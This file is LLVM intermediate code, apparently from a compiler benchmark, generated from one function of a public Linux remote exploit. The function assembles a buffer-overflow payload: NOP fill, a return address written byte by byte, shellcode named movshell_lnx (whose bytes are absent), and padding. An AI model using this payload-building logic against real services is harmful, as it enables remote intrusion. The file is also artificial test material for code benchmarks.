; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_4534.c_zbuffami.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_4534.c_zbuffami.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.target_t = type { i32, i32, i8*, i32, i32 }

@.str = private unnamed_addr constant [10 x i8] c"digitlabs\00", align 1
@NOP = common dso_local global i32 0, align 4
@movshell_lnx = common dso_local global i8* null, align 8
@llvm.used = appending global [1 x i8*] [i8* bitcast (void (i8*, %struct.target_t*)* @zbuffami to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal void @zbuffami(i8* %0, %struct.target_t* %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca %struct.target_t*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store %struct.target_t* %1, %struct.target_t** %4, align 8
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i8** %6, align 8
  %7 = load i8*, i8** %3, align 8
  %8 = load i32, i32* @NOP, align 4
  %9 = load %struct.target_t*, %struct.target_t** %4, align 8
  %10 = getelementptr inbounds %struct.target_t, %struct.target_t* %9, i32 0, i32 0
  %11 = load i32, i32* %10, align 8
  %12 = call i32 @memset(i8* %7, i32 %8, i32 %11)
  %13 = load i8*, i8** %3, align 8
  %14 = load %struct.target_t*, %struct.target_t** %4, align 8
  %15 = getelementptr inbounds %struct.target_t, %struct.target_t* %14, i32 0, i32 1
  %16 = load i32, i32* %15, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %13, i64 %17
  %19 = load %struct.target_t*, %struct.target_t** %4, align 8
  %20 = getelementptr inbounds %struct.target_t, %struct.target_t* %19, i32 0, i32 2
  %21 = load i8*, i8** %20, align 8
  %22 = load %struct.target_t*, %struct.target_t** %4, align 8
  %23 = getelementptr inbounds %struct.target_t, %struct.target_t* %22, i32 0, i32 2
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 @strlen(i8* %24)
  %26 = call i32 @memcpy(i8* %18, i8* %21, i32 %25)
  %27 = load %struct.target_t*, %struct.target_t** %4, align 8
  %28 = getelementptr inbounds %struct.target_t, %struct.target_t* %27, i32 0, i32 4
  %29 = load i32, i32* %28, align 4
  %30 = and i32 %29, 255
  %31 = trunc i32 %30 to i8
  %32 = load i8*, i8** %3, align 8
  %33 = load %struct.target_t*, %struct.target_t** %4, align 8
  %34 = getelementptr inbounds %struct.target_t, %struct.target_t* %33, i32 0, i32 3
  %35 = load i32, i32* %34, align 8
  %36 = add nsw i32 %35, 1
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %32, i64 %37
  store i8 %31, i8* %38, align 1
  %39 = load %struct.target_t*, %struct.target_t** %4, align 8
  %40 = getelementptr inbounds %struct.target_t, %struct.target_t* %39, i32 0, i32 4
  %41 = load i32, i32* %40, align 4
  %42 = and i32 %41, 65280
  %43 = ashr i32 %42, 8
  %44 = trunc i32 %43 to i8
  %45 = load i8*, i8** %3, align 8
  %46 = load %struct.target_t*, %struct.target_t** %4, align 8
  %47 = getelementptr inbounds %struct.target_t, %struct.target_t* %46, i32 0, i32 3
  %48 = load i32, i32* %47, align 8
  %49 = add nsw i32 %48, 1
  %50 = add nsw i32 %49, 1
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i8, i8* %45, i64 %51
  store i8 %44, i8* %52, align 1
  %53 = load %struct.target_t*, %struct.target_t** %4, align 8
  %54 = getelementptr inbounds %struct.target_t, %struct.target_t* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 4
  %56 = and i32 %55, 16711680
  %57 = ashr i32 %56, 16
  %58 = trunc i32 %57 to i8
  %59 = load i8*, i8** %3, align 8
  %60 = load %struct.target_t*, %struct.target_t** %4, align 8
  %61 = getelementptr inbounds %struct.target_t, %struct.target_t* %60, i32 0, i32 3
  %62 = load i32, i32* %61, align 8
  %63 = add nsw i32 %62, 1
  %64 = add nsw i32 %63, 2
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %59, i64 %65
  store i8 %58, i8* %66, align 1
  %67 = load %struct.target_t*, %struct.target_t** %4, align 8
  %68 = getelementptr inbounds %struct.target_t, %struct.target_t* %67, i32 0, i32 4
  %69 = load i32, i32* %68, align 4
  %70 = and i32 %69, -16777216
  %71 = lshr i32 %70, 24
  %72 = trunc i32 %71 to i8
  %73 = load i8*, i8** %3, align 8
  %74 = load %struct.target_t*, %struct.target_t** %4, align 8
  %75 = getelementptr inbounds %struct.target_t, %struct.target_t* %74, i32 0, i32 3
  %76 = load i32, i32* %75, align 8
  %77 = add nsw i32 %76, 1
  %78 = add nsw i32 %77, 3
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %73, i64 %79
  store i8 %72, i8* %80, align 1
  %81 = load i8*, i8** %3, align 8
  %82 = load %struct.target_t*, %struct.target_t** %4, align 8
  %83 = getelementptr inbounds %struct.target_t, %struct.target_t* %82, i32 0, i32 3
  %84 = load i32, i32* %83, align 8
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i8, i8* %81, i64 %85
  %87 = getelementptr inbounds i8, i8* %86, i64 1
  %88 = getelementptr inbounds i8, i8* %87, i64 4
  %89 = load i8*, i8** @movshell_lnx, align 8
  %90 = load i8*, i8** @movshell_lnx, align 8
  %91 = call i32 @strlen(i8* %90)
  %92 = call i32 @memcpy(i8* %88, i8* %89, i32 %91)
  %93 = load i8*, i8** %3, align 8
  %94 = getelementptr inbounds i8, i8* %93, i64 0
  store i8 0, i8* %94, align 1
  %95 = load i8*, i8** %3, align 8
  %96 = load %struct.target_t*, %struct.target_t** %4, align 8
  %97 = getelementptr inbounds %struct.target_t, %struct.target_t* %96, i32 0, i32 3
  %98 = load i32, i32* %97, align 8
  %99 = add nsw i32 %98, 1
  %100 = sext i32 %99 to i64
  %101 = add i64 %100, 4
  %102 = load i8*, i8** @movshell_lnx, align 8
  %103 = call i32 @strlen(i8* %102)
  %104 = sext i32 %103 to i64
  %105 = add i64 %101, %104
  %106 = getelementptr inbounds i8, i8* %95, i64 %105
  store i8 0, i8* %106, align 1
  %107 = load %struct.target_t*, %struct.target_t** %4, align 8
  %108 = getelementptr inbounds %struct.target_t, %struct.target_t* %107, i32 0, i32 3
  %109 = load i32, i32* %108, align 8
  %110 = add nsw i32 %109, 1
  %111 = sext i32 %110 to i64
  %112 = add i64 %111, 4
  %113 = load i8*, i8** @movshell_lnx, align 8
  %114 = call i32 @strlen(i8* %113)
  %115 = sext i32 %114 to i64
  %116 = add i64 %112, %115
  %117 = add i64 %116, 1
  %118 = trunc i64 %117 to i32
  store i32 %118, i32* %5, align 4
  br label %119

119:                                              ; preds = %138, %2
  %120 = load i32, i32* %5, align 4
  %121 = load %struct.target_t*, %struct.target_t** %4, align 8
  %122 = getelementptr inbounds %struct.target_t, %struct.target_t* %121, i32 0, i32 0
  %123 = load i32, i32* %122, align 8
  %124 = icmp slt i32 %120, %123
  br i1 %124, label %125, label %141

125:                                              ; preds = %119
  %126 = load i8*, i8** %6, align 8
  %127 = load i32, i32* %5, align 4
  %128 = load i8*, i8** %6, align 8
  %129 = call i32 @strlen(i8* %128)
  %130 = srem i32 %127, %129
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8, i8* %126, i64 %131
  %133 = load i8, i8* %132, align 1
  %134 = load i8*, i8** %3, align 8
  %135 = load i32, i32* %5, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i8, i8* %134, i64 %136
  store i8 %133, i8* %137, align 1
  br label %138

138:                                              ; preds = %125
  %139 = load i32, i32* %5, align 4
  %140 = add nsw i32 %139, 1
  store i32 %140, i32* %5, align 4
  br label %119

141:                                              ; preds = %119
  ret void
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
